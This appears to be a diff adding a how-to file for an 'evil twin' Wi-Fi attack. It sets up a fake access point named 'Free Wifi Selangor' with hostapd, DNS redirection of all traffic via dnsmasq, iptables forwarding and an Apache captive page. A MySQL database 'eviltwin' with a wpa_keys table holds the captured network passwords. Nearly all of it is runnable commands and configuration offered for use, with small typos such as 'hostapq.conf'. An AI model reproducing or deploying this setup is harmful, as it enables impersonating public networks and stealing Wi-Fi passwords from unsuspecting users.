@@ -1,0 +1,141 @@
+NOTE: Always deploy the codes as root (sudo su)
+
+apt-get update
+apt-get install dnsmasq -y
+apt-get install hostapd
+
+----------------------------------------
+
+iwconfig
+
+<--To start our network card goes into monitor mode use one of these methods. Replace the wlan0 with your card's name-->
+
+airmon-ng start wlan0
+     
+     or
+
+ifconfig wlan0 down
+iwconfig wlan0 mode monitor
+ifconfig wlan 0 up
+
+----------------------------------------
+
+mkdir ~/FakeAP
+
+cd FakeAP
+
+nano hostapd.conf
+
+<---- Copy paste this--->
+#put your wireless adapter's name
+interface=wlan0
+driver=nl80211
+#put the SSID
+ssid=Free Wifi Selangor 
+hw_mode=g
+channel=8
+macaddr_acl=0
+ignore_broadcast_ssid=0
+<----------------------->
+
+nano dnsmasq.conf
+
+<---- Copy paste this--->
+
+#Set the wifi interface
+interface=wlan0
+
+#Set the IP range that can be given to clients
+dhcp-range=192.168.1.2, 192.168.1.30, 255.255.255.0, 12h
+
+#Set the gateway IP address
+dhcp-option=3,192.168.1.1
+
+#Set DNS server address
+dhcp-option=6,192.168.1.1
+
+#Set Server
+server=8.8.8.8
+
+#logs
+log-queries
+log-dhcp
+
+#Redirect all requests to 192.168.1.1
+address=/#/192.168.1.1
+<----------------------->
+
+
+nano iptablesRules.sh
+
+<---- Copy paste this--->
+
+iptables --flush
+iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE 
+iptables --append FORWARD --in-interface wlan0 -j ACCEPT 
+echo 1 > /proc/sys/net/ipv4/ip_forward
+<----------------------->
+
+chmod +x iptablesRules.sh
+----------------------------------------
+
+nano /etc/apache2/sites-enabled/000-default.conf
+
+<---- Copy paste this--->
+</VirtualHost>
+
+<Directory "/var/www/html">
+	RewriteEngine On
+	RewriteBase /
+	RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]
+	RewriteRule ^(.*)$ http://%1/$1 [R=301,L]
+	
+	RewriteCond %{REQUEST_FILENAME} !-f
+	RewriteCond %{REQUEST_FILENAME} !-d
+	RewriteRule ^(.*)$ / [L,QSA]
+</Directory>
+
+<----------------------->
+
+a2enmod rewrite
+
+----------------------------------------
+
+NOTE: Open a new terminal
+
+rm -rf /var/www/html/*
+mv * /var/www/html
+service apache2 start
+
+----------------------------------------
+
+service mysql start
+mysql
+create database eviltwin;
+create user dodgers@localhost identified by 'duck';
+grant all privileges on eviltwin.* to 'dodgers'@'localhost';
+use eviltwin;
+create table wpa_keys(password1 varchar(32), password2 varchar(32));
+show tables;
+insert into wpa_keys(password1, password2) values ("p@s$w0rd!@#", "p@s$w0rd!@#");
+select * from wpa_keys;
+
+----------------------------------------
+
+NOTE: Open a new terminal
+
+ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
+ifconfig wlan0
+route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
+
+----------------------------------------
+
+cd ~
+cd FakeAP
+./iptablesRules.sh
+hostapd hostapq.conf
+
+Open another terminal
+
+dnsmasq -C dnsmasq.conf -d
+
